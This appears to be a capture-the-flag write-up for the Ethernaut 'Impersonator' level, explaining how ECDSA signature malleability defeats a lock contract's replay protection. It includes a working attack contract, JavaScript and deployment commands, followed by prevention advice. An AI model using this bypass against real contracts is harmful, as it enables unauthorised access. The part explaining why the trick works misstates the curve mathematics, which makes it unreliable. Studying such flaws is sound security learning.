# Level 32: Impersonator Challenge

## Challenge Description

SlockDotIt's new product, ECLocker, integrates IoT gate locks with Solidity smart contracts, utilizing Ethereum ECDSA for authorization. When a valid signature is sent to the lock, the system emits an Open event, unlocking doors for the authorized controller. SlockDotIt has hired you to assess the security of this product before its launch. Can you compromise the system in a way that anyone can open the door?

**Goal:** Emit an `Open` event from the ECLocker contract without being the authorized controller.

## Contract Location

The challenge contracts are located at:
```
/contracts/level-32-impersonator/Impersonator.sol
```

## Understanding the Challenge

### The ECLocker Contract

```solidity
contract ECLocker {
    uint256 public immutable lockId;
    bytes32 public immutable msgHash;
    address public controller;
    mapping(bytes32 => bool) public usedSignatures;

    function open(uint8 v, bytes32 r, bytes32 s) external {
        address add = _isValidSignature(v, r, s);
        emit Open(add, block.timestamp);
    }

    function _isValidSignature(uint8 v, bytes32 r, bytes32 s) internal returns (address) {
        address _address = ecrecover(msgHash, v, r, s);
        require (_address == controller, InvalidController());

        bytes32 signatureHash = keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]));
        require (!usedSignatures[signatureHash], SignatureAlreadyUsed());

        usedSignatures[signatureHash] = true;

        return _address;
    }
}
```

### Key Components

1. **lockId**: Unique identifier for the lock
2. **msgHash**: The hash that must be signed (derived from lockId)
3. **controller**: The authorized address that can open the lock
4. **usedSignatures**: Mapping to track used signatures (replay protection)
5. **open()**: Emits Open event if signature is valid
6. **_isValidSignature()**: Validates signature and marks it as used

### The Signature Validation Flow

1. Recover the signer address using `ecrecover(msgHash, v, r, s)`
2. Verify the recovered address matches the controller
3. Hash the signature components: `keccak256(abi.encode([r, s, v]))`
4. Check if this hash has been used before
5. Mark the signature hash as used

## The Vulnerability: ECDSA Signature Malleability

### Understanding ECDSA Signatures

ECDSA (Elliptic Curve Digital Signature Algorithm) signatures consist of three components:
- **v**: Recovery identifier (27 or 28)
- **r**: x-coordinate of a point on the curve
- **s**: Signature proof

### The Malleability Property

For any valid ECDSA signature `(v, r, s)`, there exists another valid signature `(v', r, s')` that recovers to the **same address**:

```
v' = v XOR 1  (flips between 27 and 28)
s' = n - s   (where n is the secp256k1 curve order)
```

The secp256k1 curve order is:
```
n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
```

### Why This Works

The elliptic curve has symmetry around the x-axis. For any point `(x, y)` on the curve, the point `(x, -y)` is also on the curve. Since we're working in a finite field modulo `n`, `-y` is equivalent to `n - y`.

This means:
- Original signature: uses point `(r, s)`
- Malleable signature: uses point `(r, n-s)`

Both are valid points that satisfy the signature equation!

### The Bug in ECLocker

```solidity
bytes32 signatureHash = keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]));
require (!usedSignatures[signatureHash], SignatureAlreadyUsed());
```

The signature hash is computed from `(r, s, v)`. Since the malleable signature has different values for `s` and `v`, it produces a **different hash**, bypassing the replay protection!

| Signature | v | r | s | Hash | Used? |
|-----------|---|---|---|------|-------|
| Original | 27 | 0x... | s | hash1 | ✅ Yes |
| Malleable | 28 | 0x... | n-s | hash2 | ❌ No! |

## The Exploit

### Step 1: Get the Original Signature

The original signature is emitted in the `NewLock` event when the ECLocker is deployed:

```solidity
emit NewLock(address(newLock), lockCounter, block.timestamp, signature);
```

For Ethernaut, you can get this from the browser console or transaction logs.

### Step 2: Parse the Signature

Extract `v`, `r`, and `s` from the signature bytes:
- `r` = bytes 0-31
- `s` = bytes 32-63
- `v` = byte 64

### Step 3: Compute Malleable Signature

```javascript
const SECP256K1_N = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");

const malleableV = originalV === 27 ? 28 : 27;
const malleableS = SECP256K1_N - BigInt(originalS);
// r stays the same
```

### Step 4: Call open() with Malleable Signature

```javascript
await locker.open(malleableV, r, malleableS);
```

The `Open` event will be emitted because:
1. `ecrecover` returns the controller address (valid signature)
2. The signature hash is different from the original (bypasses replay check)

## Solution Contract

```solidity
contract ImpersonatorAttack {
    uint256 constant SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    
    IECLocker public target;
    
    constructor(address _target) {
        target = IECLocker(_target);
    }
    
    function getMalleableSignature(uint8 v, bytes32 r, bytes32 s) 
        public 
        pure 
        returns (uint8 malleableV, bytes32 malleableR, bytes32 malleableS) 
    {
        // Flip v: 27 -> 28 or 28 -> 27
        malleableV = v == 27 ? 28 : 27;
        
        // r stays the same
        malleableR = r;
        
        // s' = n - s
        malleableS = bytes32(SECP256K1_N - uint256(s));
    }
    
    function attack(uint8 originalV, bytes32 r, bytes32 originalS) external {
        (uint8 malleableV, , bytes32 malleableS) = getMalleableSignature(originalV, r, originalS);
        target.open(malleableV, r, malleableS);
    }
}
```

## Running the Exploit

### Deploy the Attack Contract

```bash
LOCKER_ADDRESS=0xYourECLocker npx hardhat deploy --tags impersonator-solution --network sepolia
```

### Execute the Attack

```bash
LOCKER_ADDRESS=0xYourLocker V=27 R=0x... S=0x... \
npx hardhat run scripts/level-32-impersonator/attack.ts --network sepolia
```

## How to Prevent This Vulnerability

### 1. Use OpenZeppelin's ECDSA Library

OpenZeppelin's ECDSA library normalizes signatures by rejecting any signature where `s` is in the upper half of the curve order:

```solidity
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

function _isValidSignature(bytes memory signature) internal returns (address) {
    // ECDSA.recover automatically rejects malleable signatures
    return ECDSA.recover(msgHash, signature);
}
```

### 2. Manual S-Value Check

```solidity
function _isValidSignature(uint8 v, bytes32 r, bytes32 s) internal returns (address) {
    // Reject signatures with s in the upper half
    require(
        uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0,
        "Invalid signature: s too high"
    );
    
    address _address = ecrecover(msgHash, v, r, s);
    // ... rest of validation
}
```

### 3. Use EIP-712 with Proper Nonces

Instead of tracking signature hashes, use incrementing nonces:

```solidity
mapping(address => uint256) public nonces;

function open(uint8 v, bytes32 r, bytes32 s) external {
    bytes32 hash = keccak256(abi.encode(msgHash, nonces[msg.sender]++));
    address signer = ecrecover(hash, v, r, s);
    require(signer == controller, "Invalid signature");
    emit Open(signer, block.timestamp);
}
```

## Key Takeaways

1. **ECDSA signatures are inherently malleable** - For every valid signature, there's a "twin" that's also valid
2. **Don't use signature hashes for replay protection** - The hash changes with the malleable form
3. **Always normalize signatures** - Require `s` to be in the lower half of the curve order
4. **Use audited libraries** - OpenZeppelin's ECDSA library handles malleability automatically
5. **Consider nonce-based replay protection** - More robust than signature hashing

## References

- [EIP-2: Homestead Hard-fork Changes](https://eips.ethereum.org/EIPS/eip-2) - Introduced `s` value restrictions
- [OpenZeppelin ECDSA Library](https://docs.openzeppelin.com/contracts/4.x/api/utils#ECDSA)
- [Bitcoin Transaction Malleability](https://en.bitcoin.it/wiki/Transaction_malleability)
- [secp256k1 Curve Parameters](https://en.bitcoin.it/wiki/Secp256k1)
